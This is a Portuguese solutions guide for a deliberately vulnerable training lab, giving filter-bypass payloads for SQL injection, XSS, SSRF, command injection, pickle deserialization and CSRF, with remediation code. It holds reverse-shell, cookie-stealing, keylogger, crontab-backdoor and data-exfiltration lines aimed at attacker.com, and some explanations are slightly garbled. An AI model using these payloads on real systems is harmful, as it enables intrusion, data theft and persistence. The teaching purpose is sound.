# 🔓 Lab 2 - Soluções Detalhadas (Nível Médio)

## 📋 Visão Geral

Este documento contém soluções passo a passo para todas as vulnerabilidades do Lab 2 com foco em **técnicas de bypass**.

**Target**: http://localhost:5001

**Diferencial**: Este lab implementa proteções básicas que podem ser bypassadas com técnicas intermediárias.

---

## 🎯 Vulnerabilidade 1: SQL Injection com WAF Bypass

### Descrição

O formulário de login implementa um WAF (Web Application Firewall) básico que bloqueia palavras-chave comuns.

### Código Vulnerável

```python
# Blacklist implementada
blacklist = ['or', 'OR', 'and', 'AND', '--', '#', '/*', '*/']

# Verifica blacklist
for bad in blacklist:
    if bad in username or bad in password:
        return "Caracteres suspeitos detectados!"

# Query ainda é vulnerável
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### Problema

A blacklist é case-sensitive parcial e não cobre todas as variações.

### Exploração Passo a Passo

#### Método 1: Case Variation Bypass

A blacklist bloqueia `or` e `OR`, mas não `oR` ou `Or`:

```
Username: admin' oR '1'='1
Password: qualquer
```

Query resultante:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'qualquer'
```

**Por que funciona?**
- `oR` não está na blacklist
- O SQL não é case-sensitive, então `oR` = `OR`

#### Método 2: Comment Bypass

A blacklist bloqueia `/*` e `*/` separadamente, mas não juntos em sequência:

```
Username: admin'/**/oR/**/1=1/**/
Password: test
```

**Por que funciona?**
- `/**/` cria espaços invisíveis que não são detectados
- Cada `/*` e `*/` está em posição diferente

#### Método 3: Parentheses Bypass

Usar parênteses para criar lógica válida:

```
Username: admin' oR(1=1)/**/
Password: test
```

Query resultante:
```sql
SELECT * FROM users WHERE username = 'admin' OR(1=1)/**/' AND password = 'test'
```

#### Método 4: Encoding Bypass

```
Username: admin' %6fR '1'='1
Password: test
```

Onde `%6f` = `o` em URL encoding.

### Teste Automatizado

```python
import requests

# Teste com case variation
data = {
    'username': "admin' oR '1'='1",
    'password': "anything"
}

response = requests.post('http://localhost:5001/login', data=data)

if 'Login Successful' in response.text:
    print("[+] WAF bypass com case variation: SUCESSO!")
```

### Técnicas de Bypass Avançadas

```sql
-- Variações de case
Or, oR, Or, OR

-- Double encoding
%252f = /
%2527 = '

-- Unicode bypass
\u004f\u0052 = OR

-- Concatenação
'|'1'='1  (MySQL)
' || '1'='1  (PostgreSQL)

-- Operadores alternativos
&& em vez de AND
|| em vez de OR

-- Caracteres nulos
admin%00' OR '1'='1

-- Notação científica
' OR 1e0='1
```

### Remedição

```python
# CORRETO: Usar prepared statements
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?",
               (username, password))

# WAF não é suficiente sozinho!
```

---

## 🎯 Vulnerabilidade 2: XSS com Bypass de Sanitização

### Descrição

O campo de busca implementa sanitização básica que remove tags `<script>`.

### Código Vulnerável

```python
# Sanitização ingênua
def sanitize(text):
    # Remove apenas <script> e </script>
    text = text.replace('<script>', '')
    text = text.replace('</script>', '')
    return text

query = sanitize(request.args.get('q', ''))
return f"<p>Você buscou por: {query}</p>"
```

### Problema

A sanitização remove apenas uma vez e não cobre outras tags/eventos.

### Exploração Passo a Passo

#### Método 1: Nested Tags

```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
```

**Como funciona:**
1. Sanitização remove primeiro `<script>`: `<script>alert('XSS')</script>`
2. Resultado final: `<script>alert('XSS')</script>` ✓

#### Método 2: Event Handlers

A sanitização só bloqueia `<script>`, então use outros vetores:

```html
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<marquee onstart=alert('XSS')>
```

#### Método 3: Polyglot XSS

Payload que funciona em múltiplos contextos:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

#### Método 4: Case Variation

```html
<ScRiPt>alert('XSS')</sCrIpT>
<SCRIPT>alert('XSS')</SCRIPT>
```

Se a sanitização for case-sensitive.

#### Método 5: Encoding

```html
<!-- HTML Entity Encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- JavaScript Unicode -->
<script>\u0061lert('XSS')</script>

<!-- Hex encoding -->
<script>eval('\x61lert(1)')</script>
```

### Payloads Avançados

```html
<!-- Stealing Cookies -->
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

<!-- Keylogger -->
<img src=x onerror="document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}">

<!-- DOM Clobbering -->
<form name=document><input name=cookie></form>

<!-- Bypass with data: URL -->
<script src=data:text/javascript,alert('XSS')></script>

<!-- Bypass with javascript: -->
<a href="javascript:alert('XSS')">Click</a>

<!-- SVG SSRF + XSS -->
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='x' onerror='alert(1)'/></svg>#x"/></svg>
```

### Teste Automatizado

```python
import requests

payloads = [
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
]

for payload in payloads:
    response = requests.get('http://localhost:5001/search', params={'q': payload})

    # Check if payload is reflected without proper escaping
    if 'onerror' in response.text or 'onload' in response.text:
        print(f"[+] XSS Bypass SUCESSO com: {payload}")
```

### Remedição

```python
# CORRETO: Escape HTML entities
from html import escape

query = escape(request.args.get('q', ''))
return f"<p>Você buscou por: {query}</p>"

# Ou use biblioteca de sanitização robusta
import bleach
clean = bleach.clean(user_input)
```

---

## 🎯 Vulnerabilidade 3: SSRF com Bypass de IP Blacklist

### Descrição

O endpoint de fetch verifica URL e bloqueia `localhost` e `127.0.0.1`, mas a validação é insuficiente.

### Código Vulnerável

```python
url = request.form.get('url')

# Validação fraca
if 'localhost' in url or '127.0.0.1' in url:
    return "URL não permitida!"

# Fetch ainda é vulnerável
response = requests.get(url)
```

### Problema

A blacklist não cobre todas as representações de localhost.

### Exploração Passo a Passo

#### Método 1: Short Form IP

```
URL: http://127.1/
```

Equivalente a `127.0.0.1` mas não detectado.

#### Método 2: IPv6 Localhost

```
URL: http://[::1]/
URL: http://[0:0:0:0:0:0:0:1]/
```

IPv6 para localhost.

#### Método 3: Decimal IP

Converta 127.0.0.1 para decimal:
- 127 × 256³ + 0 × 256² + 0 × 256 + 1 = 2130706433

```
URL: http://2130706433/
```

#### Método 4: Octal IP

```
URL: http://0177.0.0.1/
URL: http://0x7f.0.0.1/
```

Onde `0177` é octal para 127, `0x7f` é hex.

#### Método 5: Domain Redirect

Configure um domínio que redireciona para localhost:

```
URL: http://mydomain.com/redirect-to-localhost
```

#### Método 6: DNS Rebinding

1. Configure DNS que resolve para IP público
2. Após validação, muda para 127.0.0.1
3. Explora TOCTOU (Time-of-Check, Time-of-Use)

#### Método 7: URL Parser Confusion

```
URL: http://evil.com@127.0.0.1/
URL: http://127.0.0.1#@evil.com/
URL: http://evil.com#127.0.0.1/
```

### Payloads de SSRF

```
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Internal services
http://127.1:6379/  (Redis)
http://127.1:27017/  (MongoDB)
http://127.1:3306/  (MySQL)
http://127.1:8080/  (common internal port)

# File protocol
file:///etc/passwd
file:///c:/windows/win.ini

# Alternative protocols
gopher://127.1:6379/_  (Redis exploitation)
dict://127.1:6379/info  (Port scanning)
```

### Teste Automatizado

```python
import requests

ssrf_payloads = [
    'http://127.1/',
    'http://[::1]/',
    'http://2130706433/',
    'http://0177.0.0.1/',
    'http://localhost.localdomain/',
]

for payload in ssrf_payloads:
    data = {'url': payload}
    response = requests.post('http://localhost:5001/api/fetch', data=data)

    if response.status_code == 200 and 'fetched' in response.text:
        print(f"[+] SSRF Bypass com: {payload}")
```

### Remedição

```python
# CORRETO: Validação robusta
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    try:
        parsed = urlparse(url)

        # Apenas HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False

        # Resolve hostname
        hostname = parsed.hostname
        ip = socket.gethostbyname(hostname)

        # Verifica se é IP privado
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private or ip_obj.is_loopback:
            return False

        return True
    except:
        return False

# Use whitelist em vez de blacklist
ALLOWED_DOMAINS = ['api.example.com', 'trusted.com']
```

---

## 🎯 Vulnerabilidade 4: Command Injection com Bypass

### Descrição

O endpoint de conversão de arquivo executa comandos do sistema mas filtra separadores comuns.

### Código Vulnerável

```python
filename = request.form.get('filename')

# Blacklist de separadores
blacklist = [';', '&', '|', '$', '`', '\n']
for bad in blacklist:
    if bad in filename:
        return "Caractere não permitido!"

# Comando vulnerável
os.system(f'convert {filename} output.pdf')
```

### Problema

A blacklist não cobre todos os separadores e métodos de execução.

### Exploração Passo a Passo

#### Método 1: Newline Bypass (%0A)

```
filename: test.txt%0Aid
```

`%0A` = newline, não está na blacklist em formato URL encoded.

Comando executado:
```bash
convert test.txt
id
output.pdf
```

#### Método 2: Variable Expansion

```
filename: test.txt%0Acat${IFS}/etc/passwd
```

`${IFS}` = Internal Field Separator (espaço), bypassa filtros de espaço.

#### Método 3: Brace Expansion

```
filename: test.txt%0A{cat,/etc/passwd}
```

Bash expande para `cat /etc/passwd`.

#### Método 4: Wildcard Injection

```
filename: /???/??/????wd
```

Wildcards: `/bin/sh/passwd` → `/???/??/????wd`

#### Método 5: Command Substitution Alternative

Se `$()` e `` ` `` bloqueados, use:

```bash
$(cat</etc/passwd)
{cat,/etc/passwd}
```

### Payloads Avançados

```bash
# Reverse shell
test.txt%0Abash -i >& /dev/tcp/attacker.com/4444 0>&1

# Data exfiltration
test.txt%0Acurl http://attacker.com/?data=$(cat /etc/passwd|base64)

# Persistent backdoor
test.txt%0Aecho "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# DNS exfiltration
test.txt%0Anslookup $(whoami).attacker.com
```

### Teste Automatizado

```python
import requests

data = {'filename': 'test.txt%0Aid'}
response = requests.post('http://localhost:5001/api/convert', data=data)

if 'uid=' in response.text or 'gid=' in response.text:
    print("[+] Command Injection: SUCESSO!")
    print(f"Output:\n{response.text}")
```

### Remedição

```python
# CORRETO: Não use shell commands com input do usuário!
# Use bibliotecas Python

from pathlib import Path
import subprocess

def safe_convert(filename):
    # Validação estrita
    path = Path(filename)
    if not path.is_file() or path.suffix not in ['.txt', '.jpg']:
        raise ValueError("Invalid file")

    # Use subprocess com array (não shell=True)
    subprocess.run(['convert', str(path), 'output.pdf'], shell=False, check=True)
```

---

## 🎯 Vulnerabilidade 5: Insecure Deserialization

### Descrição

O endpoint `/api/process` desserializa dados pickle do usuário sem validação.

### Código Vulnerável

```python
import pickle
import base64

data = request.form.get('data')
decoded = base64.b64decode(data)

# VULNERÁVEL: Desserializa dados não confiáveis
obj = pickle.loads(decoded)
```

### Problema

Pickle pode executar código arbitrário durante desserialização.

### Exploração Passo a Passo

#### Método 1: RCE Básico

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

# Serializa payload malicioso
malicious = pickle.dumps(RCE())
encoded = base64.b64encode(malicious).decode()

print(f"Payload: {encoded}")
```

#### Método 2: Reverse Shell

```python
class ReverseShell:
    def __reduce__(self):
        import os
        cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
```

#### Método 3: File Read

```python
class FileRead:
    def __reduce__(self):
        return (eval, ("open('/etc/passwd').read()",))
```

### Script Completo de Exploração

```python
#!/usr/bin/env python3
"""
Exploit - Insecure Deserialization (Pickle RCE)
"""

import pickle
import base64
import requests

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))

# Comando a executar
command = 'echo "PWNED" > /tmp/pwned.txt && cat /tmp/pwned.txt'

# Cria payload
payload_obj = RCE(command)
serialized = pickle.dumps(payload_obj)
encoded = base64.b64encode(serialized).decode()

print(f"[*] Payload gerado: {encoded[:50]}...")

# Envia exploit
data = {'data': encoded}
response = requests.post('http://localhost:5001/api/process', data=data)

print(f"[+] Response: {response.status_code}")
print(f"[+] Output: {response.text}")
```

### Remedição

```python
# CORRETO: Nunca use pickle para dados não confiáveis!

# Use JSON em vez de pickle
import json
data = json.loads(user_input)

# Ou use serialização segura
import marshmallow

# Se REALMENTE precisar de pickle, valide com hash
import hmac
import hashlib

def safe_pickle_loads(data, secret):
    signature, pickled = data.split(b'|')
    expected = hmac.new(secret, pickled, hashlib.sha256).hexdigest()

    if not hmac.compare_digest(signature.decode(), expected):
        raise ValueError("Invalid signature")

    return pickle.loads(pickled)
```

---

## 🎯 Vulnerabilidade 6: CSRF (Cross-Site Request Forgery)

### Descrição

Operações sensíveis não verificam CSRF token.

### Código Vulnerável

```python
@app.route('/api/change-password', methods=['POST'])
def change_password():
    # Sem verificação de CSRF token!
    new_password = request.form.get('new_password')
    # Muda senha...
```

### Exploração

Crie página HTML maliciosa:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Você ganhou um prêmio!</title>
</head>
<body>
    <h1>Clique aqui para resgatar</h1>

    <!-- Form oculto que submete automaticamente -->
    <form id="csrf" action="http://localhost:5001/api/change-password" method="POST">
        <input type="hidden" name="new_password" value="hacked123">
    </form>

    <script>
        // Auto-submit
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

### Técnicas Avançadas

#### CSRF com XSS

```javascript
// Se houver XSS, pode fazer CSRF via JavaScript
fetch('/api/change-password', {
    method: 'POST',
    body: 'new_password=hacked',
    credentials: 'include'  // Inclui cookies
});
```

#### CSRF com JSON

```html
<form action="http://localhost:5001/api/change-password" method="POST" enctype="text/plain">
    <input name='{"new_password":"hacked","ignore":"' value='"}' type='hidden'>
</form>
```

### Remedição

```python
# CORRETO: Usar CSRF tokens
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'random-secret-key'
csrf = CSRFProtect(app)

# Tokens são verificados automaticamente

# OU implemente manualmente
from secrets import token_hex

def generate_csrf_token():
    if '_csrf_token' not in session:
        session['_csrf_token'] = token_hex(32)
    return session['_csrf_token']

def verify_csrf_token():
    token = request.form.get('csrf_token')
    if not token or token != session.get('_csrf_token'):
        abort(403)
```

---

## 📊 Resumo de Vulnerabilidades

| # | Vulnerabilidade | Bypass Technique | Payload |
|---|----------------|------------------|---------|
| 1 | SQL Injection | Case variation | `admin' oR '1'='1` |
| 2 | SQL Injection | Comment injection | `admin'/**/oR/**/1=1/**/` |
| 3 | XSS | Nested tags | `<scr<script>ipt>` |
| 4 | XSS | Event handlers | `<img src=x onerror=alert(1)>` |
| 5 | SSRF | Short IP form | `http://127.1/` |
| 6 | SSRF | IPv6 localhost | `http://[::1]/` |
| 7 | SSRF | Decimal IP | `http://2130706433/` |
| 8 | Command Injection | Newline bypass | `file%0Aid` |
| 9 | Command Injection | Variable expansion | `file%0Acat${IFS}/etc/passwd` |
| 10 | Deserialization | Pickle RCE | `pickle.dumps(RCE())` |
| 11 | CSRF | Auto-submit form | Hidden form + JavaScript |

---

## 🚀 Script de Exploração Completo

```python
#!/usr/bin/env python3
"""
Exploitation Script - Lab 2 (Medium)
"""

import requests
import pickle
import base64

BASE_URL = 'http://localhost:5001'

def test_sqli_bypass():
    print("\n[*] Testando SQL Injection com WAF bypass...")
    payloads = [
        "admin' oR '1'='1",
        "admin'/**/oR/**/1=1/**/",
        "admin' oR(1=1)/**/"
    ]

    for payload in payloads:
        data = {'username': payload, 'password': 'test'}
        r = requests.post(f'{BASE_URL}/login', data=data)
        if 'Login Successful' in r.text:
            print(f"[+] SQLi bypass com: {payload}")
            return

def test_xss_bypass():
    print("\n[*] Testando XSS com bypass...")
    payloads = [
        "<scr<script>ipt>alert(1)</scr<script>ipt>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
    ]

    for payload in payloads:
        r = requests.get(f'{BASE_URL}/search', params={'q': payload})
        if 'script' in r.text.lower() or 'onerror' in r.text:
            print(f"[+] XSS bypass com: {payload}")
            return

def test_ssrf_bypass():
    print("\n[*] Testando SSRF com IP bypass...")
    payloads = [
        'http://127.1/',
        'http://[::1]/',
        'http://2130706433/'
    ]

    for payload in payloads:
        data = {'url': payload}
        r = requests.post(f'{BASE_URL}/api/fetch', data=data)
        if r.status_code == 200:
            print(f"[+] SSRF bypass com: {payload}")
            return

def test_command_injection():
    print("\n[*] Testando Command Injection...")
    data = {'filename': 'test%0Aid'}
    r = requests.post(f'{BASE_URL}/api/convert', data=data)
    if 'uid=' in r.text:
        print("[+] Command Injection: SUCESSO!")

def test_deserialization():
    print("\n[*] Testando Insecure Deserialization...")

    class RCE:
        def __reduce__(self):
            import os
            return (os.system, ('echo "DESERIALIZATION_RCE"',))

    payload = base64.b64encode(pickle.dumps(RCE())).decode()
    data = {'data': payload}
    r = requests.post(f'{BASE_URL}/api/process', data=data)

    if r.status_code == 200:
        print("[+] Deserialization: VULNERÁVEL!")

if __name__ == '__main__':
    print("=" * 80)
    print("EXPLOITATION SCRIPT - LAB 2 (MEDIUM)")
    print("=" * 80)

    test_sqli_bypass()
    test_xss_bypass()
    test_ssrf_bypass()
    test_command_injection()
    test_deserialization()

    print("\n" + "=" * 80)
    print("EXPLORAÇÃO COMPLETA!")
    print("=" * 80)
```

---

## 🎓 Lições Aprendidas

### Bypass de Filtros

1. **Blacklists são insuficientes** - Sempre há uma variação não coberta
2. **Case sensitivity importa** - SQL não é case-sensitive, mas filtros podem ser
3. **Encoding é poderoso** - URL, HTML, Unicode, Octal, Hex
4. **Context matters** - Um payload que funciona em HTML pode não funcionar em JSON

### Defesa em Profundidade

1. **Nunca confie apenas em filtros** - Use whitelists + validação + escape
2. **Input validation não é suficiente** - Use prepared statements, bibliotecas seguras
3. **Princípio do menor privilégio** - Minimize permissões de execução
4. **Monitore e alerte** - Detecte tentativas de bypass

---

**Próximo Lab**: [lab3-solutions.md](lab3-solutions.md) - Nível Difícil (Avançado)

**Voltar**: [README.md](../README.md)
